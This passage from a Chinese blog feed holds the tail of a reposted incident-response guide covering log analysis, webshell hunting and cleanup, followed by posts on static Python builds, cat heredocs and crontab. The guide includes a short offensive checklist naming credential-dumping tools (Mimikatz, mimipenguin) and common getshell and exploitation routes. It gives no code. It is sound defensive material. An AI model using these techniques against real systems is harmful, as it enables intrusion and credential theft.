class="line">17.WorkerThread枚举</div><div class="line">18.Ndis中一些回调信息枚举</div><div class="line">19.硬件调试寄存器、调试相关API检测</div><div class="line">20.枚举SFilter/Fltmgr的回调</div><div class="line"></div><div class="line">PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe631c6a.jfif)</div><div class="line"></div><div class="line">Webshell 排查</div><div class="line"></div><div class="line">1.可以使用hm</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbe892ce1.jfif)</div><div class="line"></div><div class="line">2.也可以使用盾类（D盾、暗组盾），如果可以把web目录导出，可以在自己虚拟机进行分析</div><div class="line"></div><div class="line">##### 3.2.5 日志分析</div><div class="line"></div><div class="line">1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）</div><div class="line"></div><div class="line">2.主要分析安全日志，可以借助自带的筛选功能</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbea5fc7c.jfif)</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbec097aa.jfif)</div><div class="line"></div><div class="line">![](/images/2017-12-05/593bbbedcf394.jfif)</div><div class="line"></div><div class="line">3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：</div><div class="line"></div><div class="line"> 4.  ((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</div></pre></td></tr></table></figure></p>
<p><img src="/images/2017-12-05/593bbbef9bcc6.jfif" alt=""></p>
<p>强大的日志分析工具Log Parser</p>
<p><img src="/images/2017-12-05/593bbf42e08fe.jfif" alt=""></p>
<p>#分析IIS日志<br>LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</p>
<p><img src="/images/2017-12-05/593bbf4517f29.jfif" alt=""></p>
<p>有了这些我们就可以对windows日志进行分析了 比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br>LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&#39;|&#39;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&#39;|&#39;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&#39;|&#39;) AS Client_IP FROM &#39;e:\logparser\xx.evtx&#39; WHERE EventID=675&quot;</p>
<p><img src="/images/2017-12-05/593bbf46aa511.jfif" alt=""></p>
<p>事件ID是很好的索引</p>
<p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p>
<p>3.2.6 相关处置</p>
<p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)</p>
<p>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除</p>
<p>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p>
<p>3.3 应用类</p>
<p>Apache、tomcat、Nginx、IIS</p>
<p>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:</p>
<p>find . access_log |grep xargs ip攻击地址</p>
<p>find . access_log| grep xargs 木马文件名</p>
<p>页面访问排名前十的IP<br>cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10<br>页面访问排名前十的URL<br>cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10<br>查看最耗时的页面<br>cat access.log | sort -k 2 -n -r | head 10</p>
<p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>1.首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p><img src="/images/2017-12-05/593bbf4887412.jfif" alt=""></p>
<p>2.一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p>
<p><img src="/images/2017-12-05/593bbf4a0a82f.jfif" alt=""></p>
<p>4 应急总结</p>
<p>1.核心思路是“顺藤摸瓜”</p>
<p>2.碎片信息的关联分析</p>
<p>3.时间范围的界定以及关键操作时间点串联</p>
<p>4.Web入侵类，shell定位很重要</p>
<p>5.假设与求证</p>
<p>6.攻击画像与路线确认</p>
<p>5 渗透反辅</p>
<p>1.密码读取</p>
<p>   a) Windows: Mimikatz</p>
<p>   b) Linux: mimipenguin</p>
<p>2.帐号信息</p>
<p>   a) 操作系统帐号</p>
<p>   b) 数据库帐号</p>
<p>   c) 应用帐号信息</p>
<p>3.敏感信息</p>
<p>   a) 配置信息</p>
<p>   b) 数据库信息</p>
<p>   c) 服务端口信息</p>
<p>   d) 指纹信息</p>
<p>4.滚雪球式线性拓展</p>
<p>   a) 密码口令类拓展（远控）</p>
<p>   b) 典型漏洞批量利用</p>
<p>5.常见的入侵方式Getshell方法</p>
<p>   a) WEB入侵</p>
<p>​       i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell</p>
<p>​       ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞</p>
<p>   b) 系统入侵</p>
<p>​       i. SSH 破解后登录操作</p>
<p>​       ii. RDP 破解后登录操作</p>
<p>​       iii. MSSQL破解后远控操作</p>
<p>​       iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p>
<p>   c) 典型应用</p>
<p>​       i. Mail暴力破解后信息挖掘及漏洞利用</p>
<p>​       ii. VPN暴力破解后绕过边界</p>
<p>​       iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行</p>
<p>​       iv. Rsync 未授权访问类</p>
<p>​       v. Mongodb未授权访问类</p>
<p>​       vi. Elasticsearch命令执行漏洞</p>
<p>​       vii. Memcache未授权访问漏洞</p>
<p>​       viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p>
<p>6 资源参考</p>
<p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="external">https://www.waitalone.cn/linux-find-webshell.html</a></p>
<p><a href="http://vinc.top/category/yjxy/" target="_blank" rel="external">http://vinc.top/category/yjxy/</a></p>
<p><a href="http://www.shellpub.com/" target="_blank" rel="external">http://www.shellpub.com/</a></p>
<p><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="external">http://linux.vbird.org/linux_security/0420rkhunter.php</a></p>
<p><a href="https://cisofy.com/download/lynis/" target="_blank" rel="external">https://cisofy.com/download/lynis/</a></p>
<p><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="external">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a></p>
<p><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/23358.html</a></p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="external">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p>
<p><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="external">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a></p>
<p><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3830.html</a></p>
<p><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="external">https://yq.aliyun.com/ziliao/65679</a></p>
<p><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="external">http://secsky.sinaapp.com/188.html</a></p>
<p><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a></p>
<p><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">http://www.sleuthkit.org/autopsy/</a></p>
<p>7 FAQ</p>
<p>1.应急需求有哪些分类：</p>
<p>   a) 被谁入侵了？ 关联 攻击IP 攻击者信息</p>
<p>   b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息</p>
<p>   c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息</p>
<p>   d) 数据是否被窃取？ 关联 日志审计</p>
<p>   e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</p>
<p>2.关于windows的日志工具（log parser）有无图形界面版？</p>
<p>   Log Parser Lizard 是一款用Vc++.net写的logParser增强工具。主要有以下特点：</p>
<p>   a) 封装了logParser命令，带图形界面，大大降低了LogParser的使用难度。</p>
<p>   b) 集成了几个开源工具，如log4net等。可以对IIS logs\EventLogs\active directory\log4net\File Systems\T-SQL进行方便的查询。</p>
<p>   c) 集成了Infragistics.UltraChart.Core.v4.3、Infragistics.Excel.v4.3.dll等，使查询结果可以方便的以图表或E.  XCEL格式展示。</p>
<p>   d) 集成了常见的查询命令，范围包含六大模块:IIS</p>
<p>   e) 可以将查询过的命令保存下来，方便再次使用。</p>
<p><img src="/images/2017-12-05/593bbf4b7ee3c.jfif" alt=""></p>
<p>   PS:软件是比较老的，对新系统兼容性不好，还是建议微软原生态log parser</p>
<p>3.在linux日志中，有无黑客入侵后的操作命令的统计\</p>
<p>   a) 可以根据history信息进行溯源分析，但一般可能会被清除</p>
<p>   b) 还有方法是需要结合accton 和 lastcomm</p>
<p><img src="/images/2017-12-05/593bbf4d37506.jfif" alt=""></p>
<p>\4.  3.2.3 提到了Windows-Exploit-Suggester，有无linux版？</p>
<p>Linux_Exploit_Suggester <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank" rel="external">https://github.com/PenturaLabs/Linux_Exploit_Suggester</a></p>
<p><img src="/images/2017-12-05/593bbf4f07d58.jfif" alt=""></p>
<p>5.有无linux自动化信息收集的脚本工具？</p>
<p>LinEnum  <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">https://github.com/rebootuser/LinEnum</a></p>
<p>6.</p>
<p><img src="/images/2017-12-05/593bbf5120b95.jfif" alt=""></p>
<p>7.有无综合的取证分析工具</p>
<p>Autopsy 是sleuthkit提供的平台工具，Windows 和 Linux磁盘映像静态分析、恢复被删文件、时间线分析，网络浏览历史，关键字搜索和邮件分析等功能</p>
<p><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">http://www.sleuthkit.org/autopsy/</a></p>
<p>8.关于业务逻辑的排查方法说明</p>
<p>新型业务安全中安全事件，例如撞库、薅羊毛、支付、逻辑校验等敏感环节，未在本文体现，所以后续有必要针对业务侧的应急排查方法归纳。</p>
<p>雷锋网再次声明：本文作者sm0nk@猎户攻防实验室，雷锋网宅客频道授权转载，先知技术社区拥有全部内容版权。媒体或商业转载必须获得授权，违者必追究法律责任。</p>
<p>雷锋网版权文章，未经授权禁止转载。</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 运营 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python静态编译]]></title>
      <url>/2017/12/05/python%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/</url>
      <content type="html"><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>为什么要将python编译器静态编译，主要有以下几个目的：</p>
<ol>
<li>在其他不具备python环境下的主机上运行python程序</li>
<li>在不具备相同python库的主机上运行python程序</li>
</ol>
<h3 id="1-工具集"><a href="#1-工具集" class="headerlink" title="1. 工具集"></a>1. 工具集</h3><p>到目前为止我找到了两个工具集合：</p>
<h4 id="1-1-静态编译的python解释器"><a href="#1-1-静态编译的python解释器" class="headerlink" title="1.1 静态编译的python解释器"></a>1.1 静态编译的python解释器</h4><p>这是pts大佬的一个工程 <a href="https://github.com/pts/staticpython" target="_blank" rel="external">https://github.com/pts/staticpython</a> ， 在该工程中，大佬给出了静态编译脚本，以及最终的release版本！</p>
<h4 id="1-2-结合cython的静态解释器"><a href="#1-2-结合cython的静态解释器" class="headerlink" title="1.2 结合cython的静态解释器"></a>1.2 结合cython的静态解释器</h4><p>这个工程也十分庞大，作者结合<a href="http://mdqinc.com/blog/2011/08/statically-linking-python-with-cython-generated-modules-and-packages/" target="_blank" rel="external">http://mdqinc.com/blog/2011/08/statically-linking-python-with-cython-generated-modules-and-packages/</a> 这篇文章的思路，完成了<a href="https://github.com/bendmorris/static-python" target="_blank" rel="external">static-python</a> 这个工程。</p>
<p>该工程需要用户根据需求，自行设置静态编译后的解释器所包含的库内容！（由于没有实测，只是觉得这样做不太友好，而且中间应该会有不少bug）</p>
<p>但是该工程有一个及其牛逼之处，就是它可以根据独立的py脚本，生成该脚本的静态编译后的二进制文件。</p>
<h3 id="2-自行编译"><a href="#2-自行编译" class="headerlink" title="2. 自行编译"></a>2. 自行编译</h3><p>对于python解释器的编译，我做了N多次实验，但是基本上没有一次成功的。很多时候会缺少某些库文件，甚至有时编译都通不过。所以，这儿仅结合所看到的一些文章，给出一定的猜想。</p>
<h4 id="2-1-实验环境"><a href="#2-1-实验环境" class="headerlink" title="2.1 实验环境"></a>2.1 实验环境</h4><p>docker + centos:6 + python-2.7.6.tgz</p>
<h4 id="2-2-实验参考文献"><a href="#2-2-实验参考文献" class="headerlink" title="2.2 实验参考文献"></a>2.2 实验参考文献</h4><p><a href="https://gist.github.com/ajdavis/9632280" target="_blank" rel="external">https://gist.github.com/ajdavis/9632280</a></p>
<p><a href="https://blog.fluyy.net/post/2016-01-09-static_python" target="_blank" rel="external">https://blog.fluyy.net/post/2016-01-09-static_python</a></p>
<p><a href="https://wiki.python.org/moin/BuildStatically" target="_blank" rel="external">https://wiki.python.org/moin/BuildStatically</a></p>
<p><a href="https://askubuntu.com/questions/63711/building-a-static-version-of-python" target="_blank" rel="external">https://askubuntu.com/questions/63711/building-a-static-version-of-python</a></p>
<p><a href="http://xiaoxia.org/2013/09/13/python-on-tomato/" target="_blank" rel="external">http://xiaoxia.org/2013/09/13/python-on-tomato/</a></p>
<p><a href="https://codeday.me/bug/20170923/75551.html" target="_blank" rel="external">https://codeday.me/bug/20170923/75551.html</a></p>
<h4 id="2-3-实验步骤"><a href="#2-3-实验步骤" class="headerlink" title="2.3 实验步骤"></a>2.3 实验步骤</h4><h5 id="2-3-1-安装镜像源"><a href="#2-3-1-安装镜像源" class="headerlink" title="2.3.1 安装镜像源"></a>2.3.1 安装镜像源</h5><p>用docker运行centos:6的环境</p>
<blockquote>
<p>宿主机：docker run -it --net=&quot;host&quot; -d centos:6</p>
<p>宿主机：docker exec -it container-id /bin/bash</p>
</blockquote>
<p>安装镜像源</p>
<blockquote>
<p>宿主机：wget -O CentOS-Base.repo <a href="http://mirrors.aliyun.com/repo/Centos-6.repo" target="_blank" rel="external">http://mirrors.aliyun.com/repo/Centos-6.repo</a></p>
<p>宿主机：docker cp CentOS-Base.repo container-id:/etc/yum.repos.d/CentOS-Base.repo</p>
<p>容器：yum makecache</p>
</blockquote>
<h5 id="2-3-2-软件安装"><a href="#2-3-2-软件安装" class="headerlink" title="2.3.2 软件安装"></a>2.3.2 软件安装</h5><p>安装基本软件wget、vi等(视情况而定)</p>
<p>安装必要软件glibc-static zlib-static</p>
<blockquote>
<p>容器：yum install glibc-static zlib-static</p>
</blockquote>
<h5 id="2-3-3-编译"><a href="#2-3-3-编译" class="headerlink" title="2.3.3 编译"></a>2.3.3 编译</h5><p>在配置之前，我们需要修改Modules/Setup文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#*shared* 注释掉这一行</div><div class="line">*static*  添加这一行</div></pre></td></tr></table></figure>
<p>编译</p>
<blockquote>
<p>容器：./configure  --disable-shared --enable-profiling --prefix=/path/to/mypy LDFLAGS=&quot;-static -static-libgcc&quot; CPPFLAGS=&quot;-static&quot;</p>
<p>容器：make</p>
</blockquote>
<p>这个过程会出现问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/ld: dynamic STT_GNU_IFUNC symbol strcmp&apos; with pointer equality in/usr/lib/gcc/x86_64-redhat-linux/4.4.7/../../../../lib64/libc.a(strcmp.o)&apos; can not be used when making an executable; recompile with -fPIE and relink with -pie</div></pre></td></tr></table></figure>
<p>说实在的，网上没有一篇文章提到如何解决这个问题，所以这个地方我不管了！</p>
<p>我直接做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -pthread -static -static-libgcc -o python.exe Modules/python.o libpython2.7.a -lpthread -ldl  -lutil -lm -lz</div></pre></td></tr></table></figure>
<h5 id="2-3-4-排错"><a href="#2-3-4-排错" class="headerlink" title="2.3.4 排错"></a>2.3.4 排错</h5><p>上述操作完成之后，确确实实会出现python.exe文件，但是我们运行的时候，会报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Could not find platform dependent libraries &lt;exec_prefix&gt;</div><div class="line">Consider setting $PYTHONHOME to &lt;prefix&gt;[:&lt;exec_prefix&gt;]</div><div class="line">Traceback (most recent call last):</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 548, in &lt;module&gt;</div><div class="line">    main()</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 530, in main</div><div class="line">    known_paths = addusersitepackages(known_paths)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 266, in addusersitepackages</div><div class="line">    user_site = getusersitepackages()</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 241, in getusersitepackages</div><div class="line">    user_base = getuserbase() # this will also set USER_BASE</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 231, in getuserbase</div><div class="line">    USER_BASE = get_config_var(&apos;userbase&apos;)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 517, in get_config_var</div><div class="line">    return get_config_vars().get(name)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 469, in get_config_vars</div><div class="line">    _init_posix(_CONFIG_VARS)</div><div class="line">  File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 352, in _init_posix</div><div class="line">    from _sysconfigdata import build_time_vars</div><div class="line">ImportError: No module named _sysconfigdata</div></pre></td></tr></table></figure>
<p>没有发现\_sysconfigdata.py文件！原因是因为，编译的时候没有正确通过，所以不是产生\_sysconfigdata.py文件！（是不是觉得这个问题是个死结。。。）</p>
<p>解决办法一：</p>
<p>Lib/_sysconfig.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_init_posix</span><span class="params">(vars)</span>:</span></div><div class="line">    <span class="comment">#from _sysconfigdata import build_time_vars  #注释掉</span></div><div class="line">    <span class="comment">#vars.update(build_time_vars)   #注释掉</span></div><div class="line">    <span class="keyword">pass</span> <span class="comment">#添加pass</span></div></pre></td></tr></table></figure>
<p>Lib/distuyils/sysconfig.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_init_posix</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment">#from _sysconfigdata import build_time_vars   #注释掉</span></div><div class="line">    <span class="keyword">global</span> _config_vars</div><div class="line">    _config_vars = &#123;&#125;</div><div class="line">    <span class="comment">#_config_vars.update(build_time_vars)   #注释掉</span></div></pre></td></tr></table></figure>
<p>解决办法二：</p>
<p>找到一个已经编译好的python文件，找到其中的_sysconfig.py文件，直接将其拷贝至实验环境中。</p>
<p>解决办法一，虽然可以让python.exe顺利执行，但是所有包管理都不会成功，这是因为build_time_vars中有一些环境设置，这个是找到对应的包文件的重要凭据。</p>
<p>解决办法二，虽然这个办法看起来靠谱，但是这里忽略了对_sysconfigdata.py中build_time_vars字典的理解与修改过程。这个任务也挺复杂的，所以我没来得及做。</p>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cat命令输出多行至文件]]></title>
      <url>/2017/12/04/cat%E5%91%BD%E4%BB%A4%E8%BE%93%E5%87%BA%E5%A4%9A%E8%A1%8C%E8%87%B3%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h4 id="一、cat和EOF"><a href="#一、cat和EOF" class="headerlink" title="一、cat和EOF"></a><strong>一、cat和EOF</strong></h4><p>cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的；<br>EOF是“end of file”，表示文本结束符。<br>结合这两个标识，即可避免使用多行echo命令的方式，并实现多行输出的结果。</p>
<h4 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a><strong>二、使用</strong></h4><p>看例子是最快的熟悉方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cat &lt;&lt; EOF &gt; test.sh</div><div class="line">&gt; #!/bin/bash</div><div class="line">&gt; #you Shell script writes here.</div><div class="line">&gt; EOF</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> code </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[crontab指令介绍]]></title>
      <url>/2017/11/26/crontab%E6%8C%87%E4%BB%A4%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。</p>
<h3 id="一、crond简介"><a href="#一、crond简介" class="headerlink" title="一、crond简介"></a>一、crond简介</h3><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
<p>Linux下的任务调度分为两类，系统任务调度和用户任务调度。</p>
<p>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。</p>
<p>/etc/crontab文件包括下面几行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# cat /etc/crontab </div><div class="line">SHELL=/bin/bash</div><div class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</div><div class="line">MAILTO=""</div><div class="line">HOME=/</div><div class="line"><span class="meta">#</span> run-parts</div><div class="line">51 * * * * root run-parts /etc/cron.hourly</div><div class="line">24 7 * * * root run-parts /etc/cron.daily</div><div class="line">22 4 * * 0 root run-parts /etc/cron.weekly</div><div class="line">42 4 1 * * root run-parts /etc/cron.monthly</div></pre></td></tr></table></figure>
<p>前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。</p>
<p>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。</p>
<p>使用者权限文件：</p>
<p>文件：<code>/etc/cron.deny</code></p>
<p>说明：该文件中所列用户不允许使用crontab命令</p>
<p>文件：<code>/etc/cron.allow</code></p>
<p>说明：该文件中所列用户允许使用crontab命令</p>
<p>文件：<code>/var/spool/cron/</code></p>
<p>说明：所有用户crontab文件存放的目录,以用户名命名</p>
<p>crontab文件的含义：</p>
<p>用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：</p>
<blockquote>
<p> minute   hour   day   month   week   command</p>
</blockquote>
<p>其中：</p>
<p>minute： 表示分钟，可以是从0到59之间的任何整数。</p>
<p>hour：表示小时，可以是从0到23之间的任何整数。</p>
<p>day：表示日期，可以是从1到31之间的任何整数。</p>
<p>month：表示月份，可以是从1到12之间的任何整数。</p>
<p>week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
<p>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
<p>​    <img src="/images/2017-11-26/08090352-4e0aa3fe4f404b3491df384758229be1.png" alt="img"> </p>
<p>在以上各个字段中，还可以使用以下特殊字符：</p>
<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
<h3 id="二、crond服务"><a href="#二、crond服务" class="headerlink" title="二、crond服务"></a>二、crond服务</h3><p>安装crontab:</p>
<blockquote>
<p>yum install crontabs</p>
</blockquote>
<p>服务操作说明：</p>
<blockquote>
<p>/sbin/service crond start //启动服务<br>/sbin/service crond stop //关闭服务<br>/sbin/service crond restart //重启服务<br>/sbin/service crond reload //重新载入配置</p>
</blockquote>
<p>查看crontab服务状态：</p>
<blockquote>
<p> service crond status</p>
</blockquote>
<p>手动启动crontab服务：</p>
<blockquote>
<p> service crond start</p>
</blockquote>
<p>查看crontab服务是否已设置为开机启动，执行命令：</p>
<blockquote>
<p> ntsysv</p>
</blockquote>
<p>加入开机自动启动：</p>
<blockquote>
<p> chkconfig –level 35 crond on</p>
</blockquote>
<h3 id="三、crontab命令详解"><a href="#三、crontab命令详解" class="headerlink" title="三、crontab命令详解"></a>三、crontab命令详解</h3><h4 id="1．命令格式："><a href="#1．命令格式：" class="headerlink" title="1．命令格式："></a>1．命令格式：</h4><blockquote>
<p> crontab [-u user] file</p>
<p>crontab [-u user][ -e | -l | -r ]</p>
</blockquote>
<h4 id="2．命令功能："><a href="#2．命令功能：" class="headerlink" title="2．命令功能："></a>2．命令功能：</h4><p>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。</p>
<h4 id="3．命令参数："><a href="#3．命令参数：" class="headerlink" title="3．命令参数："></a>3．命令参数：</h4><p>-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。</p>
<p>file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</p>
<p>-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</p>
<p>-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</p>
<p>-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</p>
<p>-i：在删除用户的crontab文件时给确认提示。</p>
<h4 id="4．常用方法："><a href="#4．常用方法：" class="headerlink" title="4．常用方法："></a>4．常用方法：</h4><h5 id="1-创建一个新的crontab文件"><a href="#1-创建一个新的crontab文件" class="headerlink" title="1). 创建一个新的crontab文件"></a>1). 创建一个新的crontab文件</h5><p>在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的<code>.profile</code>文件，在其中加入这样一行：</p>
<blockquote>
<p>EDITOR=vi; export EDITOR</p>
